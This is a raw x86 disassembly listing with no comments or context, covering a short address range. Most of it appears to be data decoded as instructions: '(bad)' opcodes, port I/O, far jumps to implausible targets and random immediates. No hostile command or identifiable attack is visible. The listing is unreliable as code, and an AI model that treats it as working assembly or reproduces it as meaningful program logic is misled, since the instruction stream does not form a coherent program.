  41d0ae:	jmp    0x6b5a:0x6192a90a
  41d0b5:	dec    ebp
  41d0b6:	mov    al,0xde
  41d0b8:	es hlt 
  41d0ba:	pop    eax
  41d0bb:	loop   0x41d03e
  41d0bd:	es or  esp,edx
  41d0c0:	mov    ch,ch
  41d0c2:	ja     0x41d063
  41d0c4:	in     al,0xa7
  41d0c6:	mov    ch,0x22
  41d0c8:	or     esp,edx
  41d0ca:	ss lahf 
  41d0cc:	daa    
  41d0cd:	ja     0x41d127
  41d0cf:	retf   
  41d0d0:	add    BYTE PTR [esi+edx*4-0x2f],0xfa
  41d0d5:	je     0x41d0b6
  41d0d7:	pushf  
  41d0d8:	lock mov edx,0x1783c4ac
  41d0de:	imul   edi,DWORD PTR [edx-0xe],0x7a58b0fb
  41d0e5:	and    eax,0x65a3227f
  41d0ea:	push   es
  41d0eb:	test   DWORD PTR [edx+0x4],0x2baebdab
  41d0f2:	in     eax,dx
  41d0f3:	inc    ebp
  41d0f4:	out    dx,al
  41d0f5:	pop    ecx
  41d0f6:	hlt    
  41d0f7:	xor    BYTE PTR [ebx-0x34],bl
  41d0fa:	(bad)  
  41d0fb:	ror    edx,cl
  41d0fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0fe:	dec    esp
  41d0ff:	push   0x3ac52b2e
  41d104:	bound  eax,QWORD PTR [ebp-0x69cb82d7]
  41d10a:	ret    
  41d10b:	pop    ecx
  41d10c:	mov    bl,BYTE PTR [ecx+ebp*4+0x45df7eff]
  41d113:	and    eax,0x6c94432b
  41d118:	push   ebp
  41d119:	pop    esi
  41d11a:	xchg   edi,eax
  41d11b:	pop    ebx
  41d11c:	and    al,0xf8
  41d11e:	cld    
  41d11f:	jmp    0x41d15b
  41d121:	popa   
  41d122:	sbb    eax,0xd13aa9ee
  41d127:	sbb    eax,0xdc89daa2
  41d12c:	pop    eax
  41d12d:	push   ecx
  41d12e:	add    ebx,DWORD PTR [edi]
  41d130:	mov    esp,0xb3791e7b
  41d135:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d136:	ss pop esp
  41d138:	hlt    
  41d139:	cdq    
  41d13a:	xlat   BYTE PTR ds:[ebx]
  41d13b:	int    0x74
  41d13d:	inc    ebx
  41d13e:	pop    esi
  41d13f:	cmp    eax,0xf5d70a71
  41d144:	outs   dx,DWORD PTR ds:[esi]
  41d145:	xor    BYTE PTR [edx-0x5d],ch
  41d148:	out    0xcd,al
  41d14a:	test   DWORD PTR [ebx-0xe],esi
  41d14d:	mov    al,0xcd
  41d14f:	call   0x563753e
  41d154:	cmc    
  41d155:	xchg   ecx,eax
  41d156:	push   ecx
  41d157:	call   0x96cf90cb
  41d15c:	xchg   edi,eax
  41d15d:	jnp    0x41d1cb
  41d15f:	mul    BYTE PTR [ecx+0x6dcf617e]
  41d165:	fsub   st,st(5)
  41d167:	clc    
  41d168:	push   0xffffff86
  41d16a:	push   0x9ec9de87
  41d16f:	(bad)  
  41d170:	call   0xa185:0xd598c1f3
  41d177:	idiv   BYTE PTR [ebx]
  41d179:	or     al,0x8d
  41d17b:	leave  
  41d17c:	gs in  al,0x27
  41d17f:	dec    ebx
  41d180:	jns    0x41d179
  41d182:	inc    edi
  41d183:	cmc    
  41d184:	imul   eax,DWORD PTR ds:0xad9e85d5,0x46
  41d18b:	sti    
  41d18c:	sub    al,0x8a
  41d18e:	mov    ds:0xf5edd5c2,al
  41d193:	hlt    
  41d194:	mov    al,ds:0x18f5edd6
  41d199:	push   eax
  41d19a:	jl     0x41d159
  41d19c:	icebp  
  41d19d:	lds    bx,DWORD PTR [edi+0x51]
  41d1a1:	imul   esp,DWORD PTR [eax],0x47
  41d1a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1a5:	iret   
  41d1a6:	jo     0x41d142
  41d1a8:	inc    ecx
  41d1a9:	aaa    
  41d1aa:	jecxz  0x41d16c
  41d1ac:	add    bh,ch
  41d1ae:	ins    BYTE PTR es:[edi],dx
  41d1af:	addr16 das 
  41d1b1:	dec    esp
  41d1b2:	xor    edx,0x45
  41d1b5:	pop    edi
  41d1b6:	stos   DWORD PTR es:[edi],eax
  41d1b7:	mov    eax,0x61c3f685
  41d1bc:	inc    edx
  41d1bd:	cmp    BYTE PTR [edi+0x5c],dh
  41d1c0:	push   ecx
  41d1c1:	mov    ch,0xc9
  41d1c3:	adc    dl,ah
  41d1c5:	adc    esp,DWORD PTR [ebp+0x5c]
  41d1c8:	add    eax,DWORD PTR [ecx]
  41d1ca:	std    
  41d1cb:	mov    esp,0x37092eda
  41d1d0:	out    0x4b,al
  41d1d2:	leave  
  41d1d3:	xchg   DWORD PTR [ebx-0x408d1ae0],ebp
  41d1d9:	test   BYTE PTR [ebp-0x529d086e],0x6a
  41d1e0:	inc    edi
  41d1e1:	pop    edi
  41d1e2:	(bad)  
  41d1e3:	loop   0x41d1f5
  41d1e5:	dec    eax
  41d1e6:	jg     0x41d260
  41d1e8:	shl    edi,1
  41d1ea:	jp     0x41d22b
  41d1ec:	push   ecx
  41d1ed:	sub    esi,DWORD PTR [ecx]
  41d1ef:	inc    edx
  41d1f0:	mov    ds:0x66b7d48e,eax
  41d1f5:	pop    ecx
  41d1f6:	or     eax,0x87d152dd
  41d1fb:	retf   
  41d1fc:	dec    ecx
  41d1fd:	cmp    al,0x30
  41d1ff:	mov    al,dh
  41d201:	mov    ah,0x4a
  41d203:	int3   
  41d204:	mov    al,ds:0xb1c33a7
  41d20a:	(bad)  
  41d20b:	sahf   
  41d20c:	cmp    al,0xe1
  41d20e:	sub    DWORD PTR [edi],0xf3cae05c
  41d214:	pop    es
  41d215:	jmp    0x9a45:0x356715cb
  41d21c:	xchg   esp,eax
  41d21d:	sub    ch,bh
  41d21f:	jmp    0x2ee3:0xb1e8d329
  41d226:	mov    dh,0x75
  41d228:	imul   ecx,eax,0xffffff8a
  41d22b:	fisubr DWORD PTR [esi]
  41d22d:	inc    edx
  41d22e:	je     0x41d261
  41d230:	and    al,0xf0
  41d232:	inc    ebx
  41d233:	dec    edx
  41d234:	imul   ebp,DWORD PTR [edx+0x2df5d365],0x1112bb65
  41d23e:	gs mov esp,0x6c26e4f
  41d244:	test   DWORD PTR [eax+0x7a047515],ebp
  41d24a:	lea    edi,[esi+0x1d9337dd]
  41d250:	pop    ss
  41d251:	sbb    eax,0xa314e6c3
  41d256:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d257:	clc    
  41d258:	loop   0x41d292
  41d25a:	repz pop eax
  41d25c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d25d:	mov    edi,0x7afa3359
  41d262:	jecxz  0x41d234
  41d264:	stos   BYTE PTR es:[edi],al
  41d265:	cmp    edx,DWORD PTR [ecx+0x4b5aeff1]
  41d26b:	scas   eax,DWORD PTR es:[edi]
  41d26c:	adc    bh,BYTE PTR [esi]
  41d26e:	fnstsw WORD PTR [eax+ebx*4+0x78]
  41d272:	inc    edi
  41d273:	call   0x63492c8f
  41d278:	fs dec ecx
  41d27a:	shl    esp,cl
  41d27c:	inc    ecx
  41d27d:	out    dx,al
  41d27e:	xor    al,0x3a
  41d280:	lds    ecx,FWORD PTR [edi-0x12]
  41d283:	jecxz  0x41d2e1
  41d285:	cs pop ss
  41d287:	cli    
  41d288:	std    
  41d289:	popf   
  41d28a:	mov    bh,0xa0
  41d28c:	or     DWORD PTR [ecx-0x14bda7de],esp
  41d292:	sbb    eax,0xd0363442
  41d297:	pop    eax
  41d298:	inc    ebp
  41d299:	pop    edx
  41d29a:	xchg   edi,eax
  41d29b:	loope  0x41d23b
  41d29d:	test   BYTE PTR [ebx],al
  41d29f:	dec    edi
  41d2a0:	mov    ch,BYTE PTR [edi+0x5e]
  41d2a3:	adc    al,0xfe
  41d2a5:	mov    ebx,0xbcbdc672
  41d2aa:	je     0x41d27c
  41d2ac:	call   0x59e56582
  41d2b1:	in     al,dx
  41d2b2:	jae    0x41d29f
  41d2b4:	fcom   DWORD PTR [ebp-0x7b]
  41d2b7:	cli    
  41d2b8:	scas   al,BYTE PTR es:[edi]
  41d2b9:	adc    al,cl
  41d2bb:	mov    bh,al
  41d2bd:	je     0x41d2d4
  41d2bf:	mov    cl,0xe
  41d2c1:	das    
  41d2c2:	adc    BYTE PTR [edi],ch
  41d2c4:	adc    BYTE PTR [ebx+0xa],dl
  41d2c7:	mov    bh,0x70
  41d2c9:	push   0xc3f27dc1
  41d2ce:	out    0x9,eax
  41d2d0:	aaa    
  41d2d1:	sbb    eax,0x17a79262
  41d2d6:	scas   al,BYTE PTR es:[edi]
  41d2d7:	add    al,0x6b
  41d2d9:	sahf   
  41d2da:	(bad)  
  41d2db:	das    
  41d2dc:	retf   
  41d2dd:	pop    ss
  41d2de:	xchg   edx,eax
  41d2df:	sbb    eax,0xa447a14d
  41d2e4:	pop    es
  41d2e5:	push   ss
  41d2e6:	mov    al,0xde
  41d2e8:	mov    eax,0x2a8796c2
  41d2ed:	jle    0x41d35a
  41d2ef:	fidivr DWORD PTR [edi]
  41d2f1:	adc    DWORD PTR [edx],eax
  41d2f3:	sub    eax,0xda90ee93
  41d2f8:	(bad)  
  41d2f9:	sti    
  41d2fa:	daa    
  41d2fb:	jg     0x41d2b2
  41d2fd:	pop    ds
  41d2fe:	mov    bh,0x6d
  41d300:	push   0xa0b7cb28
  41d305:	xchg   esp,eax
  41d306:	scas   eax,DWORD PTR es:[edi]
  41d307:	mov    bl,0xcd
  41d309:	retfw  0xabd4
  41d30d:	je     0x41d2cb
  41d30f:	popa   
  41d310:	jb     0x41d38a
  41d312:	xor    BYTE PTR [edx],dh
  41d314:	(bad)
  41d318:	(bad)  
  41d31a:	int3   
  41d31b:	mov    dl,0x26
  41d31d:	inc    eax
  41d31e:	or     al,0xb2
  41d320:	pop    ds
  41d321:	and    al,0x49
  41d323:	out    dx,al
  41d324:	retf   
  41d325:	stos   DWORD PTR es:[edi],eax
  41d326:	fmulp  st(4),st
  41d328:	not    BYTE PTR [ebp+0x5b]
  41d32b:	adc    al,0x6e
  41d32d:	add    eax,0x203e8381
  41d332:	out    0xd2,al
  41d334:	out    0xd6,al
  41d336:	lods   eax,DWORD PTR ds:[esi]
  41d337:	sar    DWORD PTR [edx+0x45102c1d],cl
  41d33d:	test   BYTE PTR [eax+eiz*1+0x24],ch
  41d341:	pop    eax
  41d342:	adc    DWORD PTR [edi-0x743998c8],esp
  41d348:	dec    ebx
  41d349:	xchg   DWORD PTR [edx+eiz*8+0x9],ecx
  41d34d:	out    dx,al
  41d34e:	add    eax,DWORD PTR [eax]
  41d350:	mov    bh,0xb5
  41d352:	aas    
  41d353:	add    eax,0xc4376972
  41d358:	pop    edx
  41d359:	(bad)  
  41d35a:	iret   
  41d35b:	in     eax,0xf3
  41d35d:	jg     0x41d345
  41d35f:	mov    ebx,0xaa4a33c5
  41d364:	or     BYTE PTR [ebx],al
  41d366:	imul   esp,DWORD PTR [edi],0x6870fa10
  41d36c:	adc    al,0x2f
  41d36e:	leave  
  41d36f:	or     al,0x26
  41d371:	(bad)  
  41d372:	cmp    edi,ebx
  41d374:	sbb    BYTE PTR [esi+0x1bde4402],cl
  41d37a:	pop    ecx
  41d37b:	push   ds
  41d37c:	sbb    BYTE PTR [esi],ch
  41d37e:	mov    dh,0x87
  41d380:	dec    DWORD PTR [ebp+0x288b0617]
  41d386:	inc    edi
  41d387:	push   edi
  41d388:	mov    esp,0xe9708c27
  41d38d:	or     DWORD PTR [eax+ecx*2+0x2ece39e1],eax
  41d394:	in     al,dx
  41d395:	or     BYTE PTR [edi],0xca
  41d398:	mov    dl,0x63
  41d39a:	mov    ah,0xd5
  41d39c:	jmp    0x3e21:0x868928bb
  41d3a3:	std    
  41d3a4:	jle    0x41d3ee
  41d3a6:	retf   0x716c
  41d3a9:	xchg   edx,eax
  41d3aa:	pop    ebx
  41d3ab:	cld    
  41d3ac:	shl    BYTE PTR [ebp+0x2006d6f2],1
  41d3b2:	sub    DWORD PTR [edi+ebp*2],ebp
  41d3b5:	xchg   ebp,eax
  41d3b6:	(bad)
  41d3bb:	inc    esp
  41d3bc:	inc    esp
  41d3bd:	dec    edx
  41d3be:	cmp    esp,ecx
  41d3c0:	pop    esi
  41d3c1:	adc    eax,0x79281177
  41d3c6:	ret    
  41d3c7:	adc    eax,DWORD PTR [eax]
  41d3c9:	pusha  
  41d3ca:	adc    esi,edi
  41d3cc:	xchg   si,ax
  41d3ce:	and    DWORD PTR [ebp-0x4e],ebx
  41d3d1:	pop    ds
  41d3d2:	mov    esi,0xd1c59452
  41d3d7:	dec    edi
  41d3d8:	pop    ecx
  41d3d9:	sub    esp,ebp
  41d3db:	and    ch,BYTE PTR [ebp-0x61598ba8]
  41d3e1:	dec    edi
  41d3e2:	jns    0x41d3d1
  41d3e4:	js     0x41d3f5
  41d3e6:	test   BYTE PTR [ebp-0x307fc07d],bh
  41d3ec:	ss (bad) 
  41d3ee:	xchg   edx,eax
  41d3ef:	dec    BYTE PTR [edi]
  41d3f1:	add    al,0x79
  41d3f3:	aas    
  41d3f4:	cmp    eax,0x1a7e6da8
  41d3f9:	(bad)  
  41d3fb:	inc    edx
  41d3fc:	lods   al,BYTE PTR ds:[esi]
  41d3fd:	sub    dh,BYTE PTR [ebp+0x2b]
  41d400:	outs   dx,BYTE PTR ds:[esi]
  41d401:	mov    ebx,0x1902c40a
  41d406:	aad    0x2c
  41d408:	cdq    
  41d409:	in     al,0xa9
  41d40b:	or     eax,0x228103ae
  41d410:	add    al,0xc8
  41d412:	rcl    cl,1
  41d414:	into   
  41d415:	pop    esi
  41d416:	and    eax,0xb74a5ca3
  41d41b:	fld    QWORD PTR [ebp+0x7084f3b9]
  41d421:	hlt    
  41d422:	sahf   
  41d423:	sti    
  41d424:	enter  0xbb20,0xab
  41d428:	add    al,0xd6
  41d42a:	in     al,0x8f
  41d42c:	xchg   ecx,eax
  41d42d:	mov    dl,0xf
  41d42f:	nop
  41d430:	stc    
  41d431:	in     al,0xce
  41d433:	daa    
  41d434:	and    ebx,0xffffffbd
  41d437:	(bad)  
  41d438:	test   eax,0x931a9ac6
  41d43d:	lods   eax,DWORD PTR ds:[esi]
  41d43e:	jmp    FWORD PTR [ebx-0x55]
  41d441:	and    BYTE PTR [ecx+0x13829e25],bl
  41d447:	mov    eax,0x9dedd1f6
  41d44c:	scas   al,BYTE PTR es:[edi]
  41d44d:	mov    dh,0x4e
  41d44f:	jb     0x41d433
  41d451:	ds or  eax,0x51a35583
  41d457:	or     al,cl
  41d459:	js     0x41d410
  41d45b:	rcl    al,cl
  41d45d:	enter  0xece6,0xd5
  41d461:	gs push edx
  41d463:	(bad)  
  41d464:	sbb    dl,BYTE PTR [ecx]
  41d466:	sbb    esi,DWORD PTR [edx-0x34a60df6]
  41d46c:	and    DWORD PTR [ebx+ecx*8+0x5f],edx
  41d470:	mov    ah,0x7d
  41d472:	sti    
  41d473:	in     al,dx
  41d474:	xchg   DWORD PTR [ebx-0x511d71a7],ebp
  41d47a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d47b:	repz push cs
  41d47d:	ins    DWORD PTR es:[edi],dx
  41d47e:	loop   0x41d400
  41d480:	push   cs
  41d481:	icebp  
  41d482:	mov    esp,0x892aab8
  41d487:	pop    ss
  41d488:	(bad)  [ecx]
  41d48a:	add    bl,0x66
  41d48d:	mov    ecx,0x9e280770
  41d492:	xchg   edi,eax
  41d493:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d494:	push   0xbb8318db
  41d499:	mov    al,ds:0x10959eeb
  41d49e:	pop    ecx
  41d49f:	sbb    ebp,DWORD PTR [edx-0x2aa5bc7e]
  41d4a5:	pop    esi
  41d4a6:	xor    BYTE PTR [edx-0x7d],ah
  41d4a9:	and    al,0xbe
  41d4ab:	mov    esi,0xdc632d73
  41d4b0:	cdq    
  41d4b1:	xor    al,0x37
  41d4b3:	sti    
  41d4b4:	and    esp,DWORD PTR [ebp-0x73]
  41d4b7:	jl     0x41d519
  41d4b9:	(bad)  
  41d4ba:	push   ds
  41d4bb:	mov    esp,0x6d6392f8
  41d4c0:	push   ebp
  41d4c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4c2:	rol    DWORD PTR [ecx],cl
  41d4c4:	lods   al,BYTE PTR ds:[esi]
  41d4c5:	dec    edx
  41d4c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4c7:	mov    ebx,0x33606db8
  41d4cc:	fst    QWORD PTR [ebx+0x4702807f]
  41d4d2:	in     al,dx
  41d4d3:	pushf  
  41d4d4:	popf   
  41d4d5:	sub    dh,BYTE PTR [edx]
  41d4d7:	jmp    0x36c5:0x5ca73ecd
  41d4de:	lock xor eax,0x7831c2a4
  41d4e4:	xchg   ebp,eax
  41d4e5:	pop    ds
  41d4e6:	add    al,0xd0
  41d4e8:	xchg   ecx,eax
  41d4e9:	lods   al,BYTE PTR ds:[esi]
  41d4ea:	sbb    eax,DWORD PTR [edx-0x5c]
  41d4ed:	dec    ebx
  41d4ee:	data16 (bad) 
  41d4f0:	es mov edi,0x3d80566d
  41d4f6:	mov    cl,0x7c
  41d4f8:	or     al,0x55
  41d4fa:	inc    ebx
  41d4fb:	or     cl,BYTE PTR [ebx+0x6892b67b]
  41d501:	sbb    BYTE PTR [eax-0x39],bh
  41d504:	(bad)  
  41d505:	fisubr DWORD PTR [ecx+0x4560ba1]
  41d50b:	aam    0xfd
  41d50d:	sub    edi,DWORD PTR [eax]
  41d50f:	gs push ss
  41d511:	push   es
  41d512:	mov    esp,0x7dcd644c
  41d517:	and    bh,BYTE PTR [ebp+0x20]
  41d51a:	dec    eax
  41d51b:	daa    
  41d51c:	lods   al,BYTE PTR ds:[esi]
  41d51d:	xchg   ecx,eax
  41d51e:	dec    ebx
  41d51f:	jae    0x41d574
  41d521:	inc    ebx
  41d522:	jp     0x41d4da
  41d524:	cmp    eax,0xb4691c29
  41d529:	ss ja  0x41d4f9
  41d52c:	sub    DWORD PTR [eax+eiz*8+0x2c10f88a],eax
  41d533:	sar    edx,cl
  41d535:	push   edi
  41d536:	pop    ebp
  41d537:	imul   ebx,DWORD PTR [ecx],0x2f
  41d53a:	iret   
  41d53b:	and    al,0xd8
  41d53d:	xchg   esp,eax
  41d53e:	xchg   edx,eax
  41d53f:	or     BYTE PTR [ebx+0x5f],bl
  41d542:	inc    ecx
  41d543:	je     0x41d525
  41d545:	add    DWORD PTR [ecx],esi
  41d547:	sub    al,0xf6
  41d549:	dec    ebx
  41d54a:	cdq    
  41d54b:	test   DWORD PTR [ecx-0x2f],esp
  41d54e:	mov    cl,0xa7
  41d550:	js     0x41d4f7
  41d552:	pop    esi
  41d553:	test   ah,cl
  41d555:	neg    BYTE PTR [edx-0x6701a71c]
  41d55b:	out    0xd,al
  41d55d:	in     eax,dx
  41d55e:	push   0xe52d4813
  41d563:	push   ecx
  41d564:	fcmovnb st,st(7)
  41d566:	push   0xac0d3768
  41d56b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d56c:	sbb    DWORD PTR cs:[edx-0x39c13560],ebp
  41d573:	gs sub al,0xfd
  41d576:	cmp    al,0x33
  41d578:	add    al,0x48
  41d57a:	cmc    
  41d57b:	mov    ds:0x13d9fedc,al
  41d580:	push   ecx
  41d581:	int3   
  41d582:	or     al,0xec
  41d584:	pusha  
  41d585:	call   0x2b62:0x76666e34
  41d58c:	sbb    dh,cl
  41d58e:	dec    eax
  41d58f:	inc    ecx
  41d590:	out    dx,eax
  41d591:	jo     0x41d5f9
  41d593:	hlt    
  41d594:	daa    
  41d595:	daa    
  41d596:	retf   0xf159
  41d599:	aam    0xec
  41d59b:	dec    ebx
  41d59c:	jge    0x41d5a4
  41d59e:	adc    BYTE PTR [eax],0x60
  41d5a1:	ret    0x8a65
  41d5a4:	sti    
  41d5a5:	cmp    DWORD PTR [esi],ecx
  41d5a7:	inc    edx
  41d5a8:	popf   
  41d5a9:	fiadd  WORD PTR [ebx-0x4f]
  41d5ac:	pop    edx
  41d5ad:	inc    ebx
  41d5ae:	jne    0x41d546
  41d5b0:	lahf   
  41d5b1:	test   BYTE PTR [ebp-0x49],al
  41d5b4:	adc    ch,BYTE PTR [ebp+0x4e]
  41d5b7:	(bad)  
  41d5b8:	mov    ds:0x57914ffb,eax
  41d5bd:	dec    ecx
  41d5be:	faddp  st(2),st
  41d5c0:	mov    dl,0xee
  41d5c2:	(bad)  
  41d5c3:	nop
  41d5c4:	pop    es
  41d5c5:	test   al,0xd3
  41d5c7:	mov    ds:0xe234871c,al
  41d5cc:	div    BYTE PTR [ebx]
  41d5ce:	jnp    0x41d553
  41d5d0:	push   ecx
  41d5d1:	xchg   esi,eax
  41d5d2:	enter  0x25f7,0xae
  41d5d6:	mov    al,0x12
  41d5d8:	sbb    DWORD PTR ds:[edi-0x36],edx
  41d5dc:	inc    edx
  41d5dd:	mov    edi,0x652d7063
  41d5e2:	jle    0x41d5cc
  41d5e4:	mov    eax,0xc703f0fb
  41d5e9:	test   al,0x76
  41d5eb:	stos   BYTE PTR es:[edi],al
  41d5ec:	jbe    0xdd049c65
  41d5f2:	mov    eax,ds:0x5d9636ab
  41d5f7:	inc    esp
  41d5f8:	scas   al,BYTE PTR es:[edi]
  41d5f9:	sub    cl,BYTE PTR [ecx+0x62e9213a]
  41d5ff:	ss out 0x26,eax
  41d602:	std    
  41d603:	mov    DWORD PTR ss:[edx-0x117811b1],ebp
  41d60a:	inc    ebp
  41d60b:	mov    ebx,0xe311f04e
  41d610:	cmc    
  41d611:	sti    
  41d612:	out    0x12,eax
  41d614:	sub    DWORD PTR [ecx-0x7f],ecx
  41d617:	mov    cl,0xea
  41d619:	pop    esp
  41d61a:	or     bl,BYTE PTR [edx-0x1fe7be99]
  41d620:	adc    al,0xbf
  41d622:	fcomp  QWORD PTR [esi+0x4dc7cb88]
  41d628:	cmovb  esi,ecx
  41d62b:	mov    ah,0xb0
  41d62d:	xor    eax,0x85620e6
  41d632:	jne    0x41d691
  41d634:	push   ds
  41d635:	pop    ds
  41d636:	cmp    ecx,DWORD PTR [eax+0x6d]
  41d639:	ja     0x41d687
  41d63b:	mov    bh,0x10
  41d63d:	jne    0x41d622
  41d63f:	imul   edi,DWORD PTR [esi],0xc048c62c
  41d645:	jne    0x41d619
  41d647:	jge    0x41d613
  41d649:	jmp    0x84f:0x94243760
  41d650:	call   0x149dec90
  41d655:	mov    eax,0x4eb15b9e
  41d65a:	ja     0x41d5e8
  41d65c:	sahf   
  41d65d:	popf   
  41d65e:	and    al,0xab
  41d660:	dec    edi
  41d661:	not    DWORD PTR [edx-0x7f]
  41d664:	mov    al,ds:0xcc1fe968
  41d669:	jg     0x41d610
  41d66b:	sbb    edi,DWORD PTR [ecx+0x4f]
  41d66e:	cmp    eax,0x4cd8d112
  41d673:	add    al,0xff
  41d675:	mov    dh,0x32
  41d677:	adc    BYTE PTR [ecx],al
  41d679:	je     0x41d60c
  41d67b:	push   ebx
  41d67c:	stos   BYTE PTR es:[edi],al
  41d67d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d67e:	pop    ds
  41d67f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d680:	das    
  41d681:	jge    0x41d6f4
  41d683:	adc    DWORD PTR [edi],ecx
  41d685:	cmc    
  41d686:	addr16 cld 
  41d688:	enter  0xcce5,0xda
  41d68c:	mov    ch,0xda
  41d68e:	ss sbb eax,0x8154d558
  41d694:	inc    edx
  41d695:	lock repnz test dl,cl
  41d699:	(bad)  
  41d69a:	push   ebx
  41d69b:	sahf   
  41d69c:	test   dh,bl
  41d69e:	imul   ebx,ebp,0xffffffab
  41d6a1:	arpl   WORD PTR [edx],si
  41d6a3:	cli    
  41d6a4:	int    0x33
  41d6a6:	push   ecx
  41d6a7:	push   ss
  41d6a8:	ins    DWORD PTR es:[edi],dx
  41d6a9:	sti    
  41d6aa:	mov    dh,0xcd
  41d6ac:	cdq    
  41d6ad:	(bad)
  41d6b0:	sar    BYTE PTR [ebp+0x7e],0xbe
  41d6b4:	sub    DWORD PTR [edi+0x2373e210],edx
  41d6ba:	cmp    al,0x99
  41d6bc:	pop    ebp
  41d6bd:	xchg   edi,eax
  41d6be:	sbb    eax,0x2d9521d8
  41d6c3:	rdmsr  
  41d6c5:	cmp    eax,0x1e1440db
  41d6ca:	ins    DWORD PTR es:[edi],dx
  41d6cb:	data16 add BYTE PTR [ebx-0x8],al
  41d6cf:	push   esi
  41d6d0:	popf   
  41d6d1:	sar    DWORD PTR [edx-0x2d],1
  41d6d4:	in     al,0xc4
  41d6d6:	and    DWORD PTR [ecx],ebx
  41d6d8:	inc    ebp
  41d6d9:	repnz dec DWORD PTR [edx]
  41d6dc:	(bad)  
  41d6dd:	sbb    ch,BYTE PTR [eax-0x18d554c0]
  41d6e3:	cmp    bl,BYTE PTR [ebx]
  41d6e5:	xchg   ecx,eax
  41d6e6:	cmp    eax,0x4005dbf8
  41d6eb:	mov    bh,al
  41d6ed:	dec    ecx
  41d6ee:	mov    ecx,ss
  41d6f0:	comiss xmm4,DWORD PTR [edx]
  41d6f3:	ins    DWORD PTR es:[edi],dx
  41d6f4:	cmp    edi,DWORD PTR [edi-0x4a]
  41d6f7:	mov    ebx,0x6a127dc7
  41d6fc:	idiv   DWORD PTR [ecx]
  41d6fe:	or     al,0x66
  41d700:	jge    0x41d6b8
  41d702:	xchg   esp,eax
  41d703:	sub    al,0xff
  41d705:	std    
  41d706:	enter  0xe915,0x58
  41d70a:	data16 xchg bh,dh
  41d70d:	call   0x1feb1038
  41d712:	sub    DWORD PTR [esp+edx*1+0x37],ebp
  41d716:	test   DWORD PTR [esi-0x7351642b],esp
  41d71c:	mov    bl,0x3d
  41d71e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d71f:	(bad)  
  41d720:	cdq    
  41d721:	xchg   edx,eax
  41d722:	add    BYTE PTR [esi+eax*4],ch
  41d725:	dec    esi
  41d726:	shl    BYTE PTR [edx],1
  41d728:	pushf  
  41d729:	fwait
  41d72a:	dec    ebp
  41d72b:	imul   ecx,eax,0x76
  41d72e:	stos   DWORD PTR es:[edi],eax
  41d72f:	scas   eax,DWORD PTR es:[edi]
  41d730:	push   0xffffff86
  41d732:	fwait
  41d733:	(bad)  
  41d734:	adc    BYTE PTR [eax-0x87a7a86],cl
  41d73a:	sub    al,0x5e
  41d73c:	jmp    0x41d6e1
  41d73e:	dec    edi
  41d73f:	inc    ebx
  41d740:	push   es
  41d741:	shr    DWORD PTR [esi+0x65632926],0xfa
  41d748:	aas    
  41d749:	rol    DWORD PTR [ecx-0x5f],1
  41d74c:	lock xor eax,0x9c8d1f1e
  41d752:	sbb    ebx,ecx
  41d754:	out    0x81,al
  41d756:	ins    BYTE PTR es:[edi],dx
  41d757:	adc    cl,0x7d
  41d75a:	mov    al,0x80
  41d75c:	jb     0x41d6e2
  41d75e:	or     edx,DWORD PTR [edi-0x30c0ef4c]
  41d764:	fs inc esp
  41d766:	mov    eax,ds:0xe6fedfe9
  41d76b:	xchg   edi,eax
  41d76c:	xor    dl,dh
  41d76e:	push   ecx
  41d76f:	fs mov ebp,0xcabf96e6
  41d775:	jnp    0x41d728
  41d777:	jmp    0xbb14bcf4
  41d77c:	add    bh,al
  41d77e:	inc    edx
  41d77f:	mov    dh,0xc6
  41d781:	sar    DWORD PTR [esi],1
  41d783:	inc    ebx
  41d784:	mov    BYTE PTR [edx],ah
  41d786:	idiv   BYTE PTR [edi-0x62]
  41d789:	or     ecx,edx
  41d78b:	cmp    ah,BYTE PTR [edx-0x4e]
  41d78e:	(bad)
  41d791:	add    DWORD PTR [eax+esi*8-0x7e4dfb43],edx
  41d798:	sbb    ah,BYTE PTR [esi]
  41d79a:	jmp    0x68fc:0xd33a8a82
  41d7a1:	push   esi
  41d7a2:	mov    al,ds:0x15ba9c9e
  41d7a7:	repnz std 
  41d7a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7aa:	enter  0x4d90,0x69
  41d7ae:	jbe    0x41d749
  41d7b0:	add    ch,0xb0
  41d7b3:	and    DWORD PTR [ebx],0xd3f287dd
  41d7b9:	or     edi,DWORD PTR [eax]
  41d7bb:	stc    
  41d7bc:	push   ebx
  41d7bd:	cmp    eax,0x80babbf3
  41d7c2:	lds    edi,FWORD PTR [esi]
  41d7c4:	out    dx,al
  41d7c5:	out    dx,al
  41d7c6:	es cs dec eax
  41d7c9:	ins    BYTE PTR es:[edi],dx
  41d7ca:	push   eax
  41d7cb:	pop    es
  41d7cc:	push   edx
  41d7cd:	sbb    edx,DWORD PTR [ebp+eiz*2+0x74c1573]
  41d7d4:	mov    DWORD PTR [esi+0x20d7578c],esp
  41d7da:	sti    
  41d7db:	sub    ecx,0xc04f00a8
  41d7e1:	pushf  
  41d7e2:	(bad)  
  41d7e3:	cli    
  41d7e4:	daa    
  41d7e5:	es loopne 0x41d7c8
  41d7e8:	div    DWORD PTR [edi+ebp*2]
  41d7eb:	push   0xfffffff6
  41d7ed:	xor    al,0xdb
  41d7ef:	xor    dh,al
  41d7f1:	and    eax,0x3fe72726
  41d7f6:	ret    
  41d7f7:	add    esp,edx
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	leave  
  41d7fb:	adc    bl,BYTE PTR [esi+esi*4+0xe0219fc]
  41d802:	sahf   
  41d803:	jge    0x41d7db
  41d805:	or     DWORD PTR [eax+eax*1],eax
  41d808:	push   esp
  41d809:	leave  
  41d80a:	idiv   DWORD PTR [edi-0x7fb2dee1]
  41d810:	xchg   ebp,eax
